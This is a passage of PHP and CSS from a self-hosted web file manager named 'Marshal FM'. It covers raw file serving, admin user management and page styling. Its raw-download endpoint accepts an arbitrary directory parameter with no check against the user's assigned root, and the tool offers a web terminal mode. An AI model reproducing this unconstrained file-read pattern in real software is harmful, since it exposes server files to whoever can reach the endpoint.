        echo json_encode($r);exit;
    }
    echo json_encode(['error'=>'Unknown']);exit;
}

/* ── Raw ── */
if(isset($_GET['raw'])){
    $fn=basename($_GET['raw']);$dir=isset($_GET['dir'])?realpath($_GET['dir']):__DIR__;if($dir===false)$dir=__DIR__;
    $fp=realpath($dir.'/'.$fn);
    if($fp&&is_file($fp)&&$fp!==__FILE__){
        $mime=function_exists('mime_content_type')?@mime_content_type($fp):'application/octet-stream';
        if(!$mime)$mime='application/octet-stream';
        header('Content-Type: '.$mime);header('Content-Length: '.filesize($fp));
        if(isset($_GET['dl']))header('Content-Disposition: attachment; filename="'.$fn.'"');
        readfile($fp);exit;
    }
    http_response_code(404);exit;
}

function fmtSz($b){if($b>=1073741824)return round($b/1073741824,2).' GB';if($b>=1048576)return round($b/1048576,1).' MB';if($b>=1024)return round($b/1024,1).' KB';return $b.' B';}
function fmtUptime($s){$s=(int)$s;$d=intdiv($s,86400);$h=intdiv($s%86400,3600);$m=intdiv($s%3600,60);if($d>0)return $d.'d '.$h.'h';if($h>0)return $h.'h '.$m.'m';return $m.'m';}
$fm->handle();

/* Zero-click Guardian setup: only reached on a real (non-AJAX, non-raw,
   non-share) page render by an already-authenticated admin — the very
   moment this qualifies as "the file manager page being opened". */
if(!empty($_SESSION['auth'])&&!empty($_SESSION['fm_admin']))fm_guardian_first_run_bootstrap($fm);

/* ── User management ── */
$userMsg=null;
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['action'])&&in_array($_POST['action'],['add_user','remove_user'])){
    if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$userMsg=['Security error.','danger'];}
    elseif(empty($_SESSION['fm_admin'])){$userMsg=['Admins only.','danger'];}
    else{$users=fm_load_users($usersFile);
        if($_POST['action']==='add_user'){$nu=trim(isset($_POST['new_user'])?$_POST['new_user']:'');$np=isset($_POST['new_pass'])?$_POST['new_pass']:'';$nr=trim(isset($_POST['new_root'])?$_POST['new_root']:'');$nro=isset($_POST['new_readonly'])&&$_POST['new_readonly']==='1';$nq=trim(isset($_POST['new_quota'])?$_POST['new_quota']:'0');
            $quotaBytes=0;
            if($nq!==''&&strtolower($nq)!=='unlimited'){
                if(!is_numeric($nq)||$nq<0){$userMsg=['Quota must be 0 (unlimited) or a positive number of MB.','danger'];}
                else $quotaBytes=(int)round((float)$nq*1048576);
            }
            if(!$userMsg&&!$nu||!$userMsg&&!$np){$userMsg=['Username and password required.','danger'];}elseif(!$userMsg&&fm_find_user($users,$nu)){$userMsg=['Username exists.','danger'];}elseif(!$userMsg&&$nr!==''&&!is_dir($nr)){$userMsg=['Folder not found.','danger'];}
            elseif(!$userMsg){$users[]=['user'=>$nu,'hash'=>password_hash($np,PASSWORD_DEFAULT),'root'=>$nr,'readonly'=>$nro,'admin'=>false,'quota_bytes'=>$quotaBytes];fm_save_users($usersFile,$users);$userMsg=["User '$nu' created.",'success'];}
        }elseif($_POST['action']==='remove_user'){$tu=trim(isset($_POST['target_user'])?$_POST['target_user']:'');
            if($tu==='admin'||$tu===$_SESSION['fm_user']){$userMsg=['Cannot remove this account.','danger'];}
            else{$users=array_values(array_filter($users,fn($u)=>$u['user']!==$tu));fm_save_users($usersFile,$users);$userMsg=["User '$tu' removed.",'success'];}
        }
    }
    header("Location: ".basename(__FILE__)."?dir=".urlencode($fm->getCwd())."&umsg=".urlencode($userMsg[0])."&utype=".urlencode($userMsg[1]));exit;
}
if(isset($_GET['umsg']))$fm->addMsg($_GET['umsg'],isset($_GET['utype'])?$_GET['utype']:'success');

$list=$fm->scan();
$editMode=false;$editContent='';$editFile='';
if(isset($_GET['edit'])){$fn=basename($_GET['edit']);$fp=realpath($fm->getCwd().'/'.$fn);if($fp&&is_file($fp)&&$fp!==__FILE__){$editMode=true;$editFile=$fn;$editContent=file_get_contents($fp);}}

$totalFolders=count($list['folders']);$totalFiles=count($list['files']);
$totalSize=0;foreach($list['files']as $f)$totalSize+=$f['size'];
$diskTotal=$fm->diskTotal();$diskFree=$fm->diskFree();$diskUsed=$diskTotal-$diskFree;$diskPct=$diskTotal>0?round(($diskUsed/$diskTotal)*100):0;
$curSort=isset($_GET['sort'])?$_GET['sort']:'name';$curDir_=isset($_GET['sdir'])?$_GET['sdir']:'asc';
$curHidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';$curTF=isset($_GET['tf'])?$_GET['tf']:'';
$terminalStandalone=isset($_GET['terminal'])&&$_GET['terminal']==='1';
if($terminalStandalone)fm_ensure_terminal_font();
function sortUrl($col){global $curSort,$curDir_;$d=($curSort===$col&&$curDir_==='asc')?'desc':'asc';$q=$_GET;$q['sort']=$col;$q['sdir']=$d;return '?'.http_build_query($q);}

function svgFolder(){return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="#85898C" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(133,137,140,.15)"/></svg>';}
function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>','video'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>','audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>','archive'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>','pdf'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><text x="12" y="18" font-size="6" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700">PDF</text>','word'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/>','excel'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><path d="M9.5 13l5 6M14.5 13l-5 6"/>','code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>','data'=>'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>','text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>','config'=>'<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82V9a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9z"/>','file'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'];$inner=isset($p[$t])?$p[$t]:$p['file'];return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="'.$color.'" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">'.$inner.'</svg>';}
?>
<!DOCTYPE html>
<html lang="en" data-theme="<?=htmlspecialchars($currentTheme)?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Marshal FM</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
/* ══ RESET & TOKENS ══ */
@font-face{font-family:'TerminalTMT';src:url('attached_assets/fonts/tmt.ttf') format('truetype'),url('https://github.com/orgezeo/marshal-file-manager/raw/refs/heads/main/fonts/terminal/tmt.ttf') format('truetype');font-weight:100 900;font-style:normal;font-display:block}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
   --bg:#101010;--panel:#151515;--surf:#191919;--raised:#202020;--hov:#272727;--act:#2F2F2F;
   --border:rgba(125,129,132,.17);--border2:rgba(125,129,132,.29);
   --t1:#C9C6C2;--t2:#929495;--t3:#777A7C;--link:#C9C6C2;
  --indigo:#C9C6C2;--indigo2:#454744;--check:#3F4140;--check-border:#74787A;
  --green:#22c55e;--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--pink:#ec4899;--purple:#8b5cf6;
  --sw:240px;--th:52px;--bh:26px;
  --r:10px;--rlg:14px;--rxl:18px;
   --spring:cubic-bezier(.34,1.56,.64,1);--out:cubic-bezier(.25,.46,.45,.94);
   --fw-regular:400;--fw-medium:600;--fw-strong:700;--fw-muted:300;
  --field:rgba(0,0,0,.58);--fieldb:rgba(125,129,132,.18);--fieldb-h:rgba(125,129,132,.34);--fieldh:rgba(125,129,132,.045);
}
:root[data-theme="light"]{
  --bg:#f1f1f1;--panel:#ffffff;--surf:#ffffff;--raised:#e5e5e5;--hov:#dcdcdc;--act:#d2d2d2;
  --border:rgba(99,100,95,.2);--border2:rgba(99,100,95,.35);
  --t1:#181818;--t2:#63645F;--t3:#85898C;--link:#63645F;
  --field:rgba(0,0,0,.035);--fieldb:rgba(0,0,0,.16);--fieldb-h:rgba(0,0,0,.32);--fieldh:rgba(0,0,0,.04);--check:#5F625E;--check-border:#85898C;
}
html{height:100%;-webkit-tap-highlight-color:transparent}
body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;font-weight:var(--fw-regular);background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;transition:background-color .2s var(--out),color .2s var(--out)}

/* ══ LAYOUT ══ */
.shell{display:grid;grid-template:"tb tb" var(--th) "sb main" 1fr "bar bar" var(--bh) / var(--sw) 1fr;height:100vh;overflow:hidden}

/* ══ TOPBAR ══ */
.topbar{grid-area:tb;background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 10px;gap:6px;z-index:200;min-width:0}
.brand{display:flex;align-items:center;gap:8px;width:var(--sw);flex-shrink:0;text-decoration:none;padding-right:4px;min-width:0}
 .brand-icon{width:32px;height:32px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:transform .25s var(--spring)}
.brand-icon:hover{transform:scale(1.12)}
 .brand-icon img{width:32px;height:32px;object-fit:contain}
.brand-name{font-size:13px;font-weight:var(--fw-strong);color:var(--t1);letter-spacing:-.2px;white-space:nowrap}
.dv{width:1px;height:18px;background:var(--border);flex-shrink:0}
.bc{display:flex;align-items:center;flex:1;overflow:hidden;min-width:0}
.bc-crumb{display:flex;align-items:center;animation:fadeSlide .3s var(--spring) both}
@keyframes fadeSlide{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
.bc-crumb:nth-child(n+2){animation-delay:.05s}
.bc a{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t2);text-decoration:none;padding:3px 6px;border-radius:6px;transition:background .15s,color .15s;white-space:nowrap;max-width:120px;overflow:hidden;text-overflow:ellipsis;display:inline-block}
.bc a:hover{background:var(--hov);color:var(--link)}.bc a.last{color:var(--t1);font-weight:600}
.bc-sep{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t3);padding:0 1px;user-select:none}
.tb-right{display:flex;align-items:center;gap:6px;margin-left:auto;flex-shrink:0}
.tb-right .btn{height:32px;justify-content:center}
.tb-right .btn-icon{width:32px;min-width:32px;padding:0}
.tb-right .btn-sm{min-width:32px;padding:0 10px}
.tb-right .btn svg{flex-shrink:0}
.tsearch{height:32px;display:flex;align-items:center;gap:6px;background:var(--field);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
.tsearch:focus-within{border-color:rgba(133,137,140,.55)}
.tsearch svg{width:13px;height:13px;stroke:var(--t3);fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.tsearch input{background:transparent;border:none;outline:none;color:var(--t1);font-size:12px;padding:6px 4px;width:150px}
.tsearch input::placeholder{color:var(--t3)}

/* ══ SIDEBAR ══ */
.sidebar{grid-area:sb;background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
.sb-sec{padding:14px 10px 0}
.sb-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);padding:4px 10px 7px;display:flex;align-items:center;justify-content:space-between}
.sb-nav{display:flex;flex-direction:column;gap:3px}
.sb-item{display:flex;align-items:center;gap:10px;padding:8px 11px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;font-weight:var(--fw-medium);transition:background .15s,color .15s,transform .18s var(--spring);cursor:pointer;border:none;background:transparent;width:100%;text-align:left;white-space:nowrap;overflow:hidden;min-height:34px}
.sb-item svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0;transition:transform .18s var(--spring)}
.sb-item:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-item:hover svg{transform:scale(1.1)}.sb-item:active{transform:scale(.97)}
.sb-item.danger:hover{background:rgba(239,68,68,.08);color:#fca5a5}
.sb-div{height:1px;background:var(--border);margin:10px 10px}
.sb-scroll{flex:1;overflow-y:auto;overflow-x:hidden;padding:0 10px 10px;min-height:0}
.sb-scroll::-webkit-scrollbar{width:3px}.sb-scroll::-webkit-scrollbar-thumb{background:rgba(255,255,255,.07);border-radius:6px}
.sb-flink{display:flex;align-items:center;gap:8px;padding:7px 11px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;transition:background .15s,color .15s,transform .18s var(--spring);min-height:32px}
.sb-flink svg{width:14px;height:14px;flex-shrink:0;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round}
.sb-flink span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
.sb-flink:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-flink:active{transform:scale(.97)}
.sb-empty{font-size:11.5px;font-weight:var(--fw-muted);color:var(--t3);padding:8px 10px;font-style:italic}
.sb-fav-row{display:flex;align-items:center;gap:2px}
.sb-fav-del{background:none;border:none;color:var(--t3);cursor:pointer;padding:4px;border-radius:6px;display:flex;flex-shrink:0;transition:color .15s,background .15s}
.sb-fav-del:hover{color:#fca5a5;background:rgba(239,68,68,.1)}.sb-fav-del svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2}
.sb-footer{padding:8px;flex-shrink:0;border-top:1px solid var(--border)}
.disk-w{padding:4px 2px 2px}
.disk-lbl{display:flex;justify-content:space-between;font-size:10px;color:var(--t3);margin-bottom:5px;font-family:'JetBrains Mono',monospace}
.disk-tr{height:5px;background:var(--raised);border-radius:5px;overflow:hidden}
.disk-fi{height:100%;background:linear-gradient(90deg,var(--indigo2),var(--indigo));border-radius:5px;transition:width .4s var(--out)}
.disk-fi.warn{background:linear-gradient(90deg,#d97706,var(--amber))}.disk-fi.crit{background:linear-gradient(90deg,#b91c1c,var(--red))}

/* ══ MAIN ══ */
.main{grid-area:main;display:flex;flex-direction:column;overflow:hidden;min-width:0;position:relative}
.toolbar{padding:10px 12px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;flex-wrap:nowrap;gap:8px;align-items:stretch;flex-shrink:0}
.toolbar .tb-row{display:flex;align-items:center;flex-wrap:nowrap!important;gap:8px;width:100%;min-width:0}
.toolbar .tb-row .inp{height:32px;padding-top:0;padding-bottom:0}
.toolbar .tb-row .btn-sm,.toolbar .tb-row .upl-lbl{height:29px;justify-content:center;padding-top:0;padding-bottom:0}
.toolbar .tb-row .btn-sm{flex-shrink:0}
.content{flex:1;overflow-y:auto;padding:12px;position:relative}
.content::-webkit-scrollbar{width:4px}.content::-webkit-scrollbar-thumb{background:rgba(255,255,255,.07);border-radius:6px}
.content.drag-over::after{content:'Drop files to upload';position:absolute;inset:8px;border:2px dashed var(--indigo);border-radius:var(--rlg);background:rgba(133,137,140,.07);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;color:var(--link);pointer-events:none;z-index:50}

/* ══ ALERTS ══ */
.alerts{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
.alert{display:flex;align-items:center;gap:9px;padding:9px 12px;border-radius:var(--r);font-size:13px;border:1px solid transparent;animation:alertIn .3s var(--spring) both}
@keyframes alertIn{from{opacity:0;transform:translateY(-8px) scale(.97)}to{opacity:1;transform:none}}
.alert svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
.alert.success{background:rgba(34,197,94,.07);border-color:rgba(34,197,94,.2);color:#86efac}
.alert.danger{background:rgba(239,68,68,.07);border-color:rgba(239,68,68,.2);color:#fca5a5}
.alert.warning{background:rgba(245,158,11,.07);border-color:rgba(245,158,11,.2);color:#fcd34d}
.alert-x{margin-left:auto;background:none;border:none;cursor:pointer;color:inherit;opacity:.5;padding:2px;border-radius:4px;display:flex;transition:opacity .15s,transform .15s var(--spring)}
.alert-x:hover{opacity:1;transform:scale(1.15)}.alert-x svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2}

/* ══ FILE TABLE ══ */
.card{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);overflow:hidden}
.tw{overflow-x:auto}
.ft{width:100%;border-collapse:collapse}
.ft thead tr{background:var(--raised);border-bottom:1px solid var(--border)}
.ft th{padding:7px 10px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);text-align:left;white-space:nowrap;user-select:none}
.ft th a{color:inherit;text-decoration:none;display:inline-flex;align-items:center;gap:3px;transition:color .15s}
.ft th a:hover{color:var(--t2)}.sa a{color:var(--link)!important}.sa .arr{color:var(--link)}
.arr{opacity:.5;font-size:9px}
.ft tbody tr{border-bottom:1px solid var(--border);transition:background .12s;animation:rIn .25s var(--spring) both}
.ft tbody tr:last-child{border-bottom:none}.ft tbody tr:hover{background:var(--hov)}.ft tbody tr.selected{background:rgba(133,137,140,.09)}
.ft tbody tr:focus{outline:2px solid rgba(133,137,140,.5);outline-offset:-2px}
<?php for($i=1;$i<=60;$i++) echo ".ft tbody tr:nth-child($i){animation-delay:".($i*.018)."s}\n";?>
@keyframes rIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.ft td{padding:6px 10px;vertical-align:middle}
/* ══ GLOBAL INPUTS DARK THEME ══ */
input[type=checkbox],input[type=radio]{
  appearance:none;-webkit-appearance:none;cursor:pointer;
  width:15px;height:15px;
  background:var(--field);
  border:1.5px solid var(--fieldb);
  border-radius:4px;
  display:inline-flex;align-items:center;justify-content:center;
  flex-shrink:0;position:relative;
  transition:background .15s,border-color .15s,box-shadow .15s;
  vertical-align:middle;
}
input[type=radio]{border-radius:50%}
input[type=checkbox]:hover,input[type=radio]:hover{border-color:var(--fieldb-h);background:var(--fieldh)}
input[type=checkbox]:checked,input[type=radio]:checked{background:var(--check);border-color:var(--check-border);box-shadow:0 0 0 3px rgba(125,129,132,.1)}
input[type=checkbox]:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
input[type=radio]:checked::after{content:'';position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%)}
input[type=checkbox]:focus,input[type=radio]:focus{outline:none;box-shadow:0 0 0 3px rgba(125,129,132,.16)}
.cc{width:32px}.rck{width:15px;height:15px;cursor:pointer;appearance:none;-webkit-appearance:none;background:var(--field);border:1.5px solid var(--fieldb);border-radius:4px;display:inline-block;position:relative;flex-shrink:0;transition:background .15s,border-color .15s}
.rck:hover{border-color:rgba(160,160,160,.28)}.rck:checked{background:var(--check);border-color:var(--check-border)}
.rck:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
.nc{display:flex;align-items:center;gap:9px;cursor:pointer;min-width:0}
.ib{width:29px;height:29px;flex-shrink:0;border-radius:8px;display:flex;align-items:center;justify-content:center;transition:transform .18s var(--spring)}
.ft tbody tr:hover .ib{transform:scale(1.08)}.ib .ti{width:17px;height:17px}
.nm{min-width:0}
.tag-dot{margin-right:6px;vertical-align:middle}
.nt{color:var(--t1);font-weight:var(--fw-medium);font-size:13px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;text-decoration:none;transition:color .15s}
a.nt:hover{color:var(--link)}
.eb{display:inline-block;margin-top:1px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:var(--raised);color:var(--t3)}
.mono{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--t2);padding:2px 7px;border-radius:5px;background:var(--raised);white-space:nowrap}
.sz{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--t2);white-space:nowrap}
.mt{font-family:'JetBrains Mono',monospace;font-size:10.5px;color:var(--t3);white-space:nowrap}
.acts{display:flex;gap:3px;justify-content:flex-end}

/* ══ GRID VIEW ══ */
.gv{display:grid;grid-template-columns:repeat(auto-fill,minmax(112px,1fr));gap:6px;padding:2px}
.gi{background:var(--surf);border:1px solid var(--border);border-radius:var(--r);padding:9px 8px 8px;display:flex;flex-direction:column;align-items:center;gap:5px;cursor:pointer;transition:background .15s,border-color .15s,transform .18s var(--spring);position:relative;animation:rIn .25s var(--spring) both}
.gi:hover{background:var(--hov);border-color:var(--border2);transform:translateY(-2px)}.gi:active{transform:scale(.97)}
.gi.selected{border-color:var(--indigo);background:rgba(133,137,140,.07)}
.gi-ic{width:38px;height:38px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.gi-ic .ti{width:22px;height:22px}.gi-th{width:38px;height:38px;border-radius:8px;object-fit:cover;display:block}
.gi-n{font-size:11.5px;font-weight:var(--fw-medium);color:var(--t1);text-align:center;word-break:break-word;max-width:100px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
.gi-m{font-size:10px;color:var(--t3);font-family:'JetBrains Mono',monospace}
.gi-ck{position:absolute;top:6px;left:6px;opacity:0;transition:opacity .15s}
.gi:hover .gi-ck,.gi.selected .gi-ck{opacity:1}

/* ══ FILTER BAR ══ */
.filter-bar{display:flex;align-items:center;gap:5px;padding:0 0 8px;flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch}
.filter-bar::-webkit-scrollbar{display:none}
.fb-btn{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:20px;font-size:11.5px;font-weight:600;border:1px solid var(--border);background:transparent;color:var(--t2);cursor:pointer;white-space:nowrap;transition:all .15s;-webkit-user-select:none;user-select:none}
.fb-btn:hover{background:var(--hov);color:var(--t1);border-color:var(--border2)}.fb-btn.active{background:rgba(133,137,140,.12);color:var(--link);border-color:rgba(133,137,140,.3)}

/* ══ BULK BAR ══ */
.bulk-bar{position:absolute;left:50%;bottom:14px;transform:translate(-50%,130%);background:var(--raised);border:1px solid var(--border2);border-radius:13px;padding:7px 9px;display:flex;align-items:center;gap:6px;box-shadow:0 16px 48px rgba(0,0,0,.6);transition:transform .28s var(--spring);z-index:80}
.bulk-bar.show{transform:translate(-50%,0)}.bkc{font-size:12px;color:var(--t1);font-weight:700;padding:0 5px;white-space:nowrap}

/* ══ STATUS BAR ══ */
 .bar{grid-area:bar;background:linear-gradient(90deg,var(--indigo2),#606467);display:flex;align-items:center;padding:0 12px;gap:16px;overflow:hidden}
.bs{display:flex;align-items:center;gap:4px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.7);white-space:nowrap}
.bs svg{width:11px;height:11px;stroke:rgba(255,255,255,.8);fill:none;stroke-width:2;stroke-linecap:round}.bs strong{color:#fff;font-weight:700}
.bs-click{cursor:pointer;transition:opacity .15s}.bs-click:hover{opacity:.72;text-decoration:underline}
.br{margin-left:auto;display:flex;gap:16px;align-items:center}

/* ══ BUTTONS ══ */
.btn{display:inline-flex;align-items:center;gap:5px;padding:7px 13px;border-radius:var(--r);font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;font-size:12.5px;font-weight:var(--fw-medium);border:none;cursor:pointer;text-decoration:none;white-space:nowrap;line-height:1;transition:background .15s,transform .18s var(--spring),box-shadow .15s;-webkit-user-select:none;user-select:none}
.btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}.btn:active{transform:scale(.93)!important}
.btn-sm{padding:5px 11px;font-size:12px;border-radius:8px}.btn-sm svg{width:12px;height:12px}
.btn-icon{padding:6px;border-radius:8px}.btn-icon svg{width:14px;height:14px}
.btn-xs{padding:4px 8px;font-size:11.5px;border-radius:7px;gap:3px}.btn-xs svg{width:12px;height:12px}
/* Compact text actions keep the top bar and file toolbar aligned with the
   smaller action buttons used throughout the manager. Icon-only controls
   intentionally keep their 32px touch target. */
.topbar .btn-sm{height:29px;padding:4px 9px;font-size:11.5px;border-radius:7px}
.topbar .btn-sm svg{width:12px;height:12px;stroke-width:2}
.topbar .tb-right .btn-icon{width:29px;min-width:29px;height:29px;padding:5px;border-radius:7px}
.topbar .tb-right .btn-icon svg{width:12px;height:12px}
.toolbar .tb-row .btn-sm,.toolbar .tb-row .upl-lbl{padding-left:9px;padding-right:9px;font-size:11.5px;border-radius:7px}
.toolbar .tb-row .btn-sm svg,.toolbar .tb-row .upl-lbl svg{width:12px;height:12px}
 .btn-p{background:#C9C6C2;color:#101010;box-shadow:0 2px 8px rgba(201,198,194,.13)}.btn-p:hover{background:#E1DDD8;transform:translateY(-1px);box-shadow:0 5px 16px rgba(201,198,194,.2)}
 .btn-g{background:#454744;color:#C9C6C2;border:1px solid #606467}.btn-g:hover{background:#606467;color:#101010;border-color:#C9C6C2;transform:translateY(-1px)}
.btn-green{background:rgba(34,197,94,.1);color:#86efac;border:1px solid rgba(34,197,94,.2)}.btn-green:hover{background:rgba(34,197,94,.17);transform:translateY(-1px)}
.btn-amb{background:rgba(245,158,11,.1);color:#fcd34d;border:1px solid rgba(245,158,11,.2)}.btn-amb:hover{background:rgba(245,158,11,.17);transform:translateY(-1px)}
.btn-red{background:rgba(239,68,68,.1);color:#fca5a5;border:1px solid rgba(239,68,68,.18)}.btn-red:hover{background:rgba(239,68,68,.17);transform:translateY(-1px)}
.btn-blue,.btn-purp{background:rgba(80,81,77,.28);color:#A6A7A6;border:1px solid rgba(112,116,119,.36)}.btn-blue:hover,.btn-purp:hover{background:rgba(112,116,119,.42);color:#D8D4D0;transform:translateY(-1px)}
.btn-star{background:rgba(245,158,11,.12);color:#fcd34d;border:1px solid rgba(245,158,11,.25)}.btn-star:hover{background:rgba(245,158,11,.2);transform:translateY(-1px)}

/* ══ INPUTS ══ */
.inp{background:var(--field);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
.inp::placeholder{color:var(--t3)}
select.inp{color-scheme:dark}
:root[data-theme="light"] select.inp{color-scheme:light}
.inp::placeholder{color:var(--t3)}.inp:focus{border-color:rgba(133,137,140,.6);box-shadow:0 0 0 3px rgba(133,137,140,.16)}
.upl-lbl{display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:var(--r);font-size:12.5px;font-weight:var(--fw-medium);font-family:'Inter',ui-sans-serif,system-ui,sans-serif;cursor:pointer;white-space:nowrap;border:1.5px dashed rgba(133,137,140,.45);color:var(--t2);background:rgba(133,137,140,.06);transition:border-color .18s,color .18s,background .18s,transform .18s var(--spring)}
.upl-lbl svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
.upl-lbl:hover{border-color:var(--indigo);color:var(--link);background:rgba(133,137,140,.12);transform:translateY(-1px)}.upl-lbl:active{transform:scale(.97)}
input[type=file]{display:none}

/* ══ OVERLAY / MODAL ══ */
.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:150;opacity:0;transition:opacity .25s}
.ov.vis{opacity:1}
.mod-ov{display:none;position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.8);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:20px}
.mod-ov.open{display:flex}
